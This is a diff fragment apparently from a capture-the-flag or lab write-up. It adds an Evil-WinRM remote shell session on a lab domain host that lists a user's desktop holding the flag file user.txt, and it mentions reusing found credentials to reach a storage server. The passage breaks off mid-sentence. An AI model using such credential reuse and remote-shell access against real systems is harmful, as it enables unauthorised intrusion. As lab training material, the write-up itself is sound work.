@@ -769,3 +769,20 @@ WINRM       10.0.0.101      5985   STORAGE          [-] novaforge.local\daniel.b
 
 So i can use `ryan.collins` to get access to the storage server!
 
+```python
+*Evil-WinRM* PS C:\Users\daniel.brooks\Desktop> dir
+
+
+    Directory: C:\Users\daniel.brooks\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         6/20/2026   4:36 AM           1479 Opera Browser.lnk
+-a----         6/28/2026  12:25 PM           8528 user.txt
+
+
+*Evil-WinRM* PS C:\Users\daniel.brooks\Desktop>
+```
+
+Looks like this user has ope
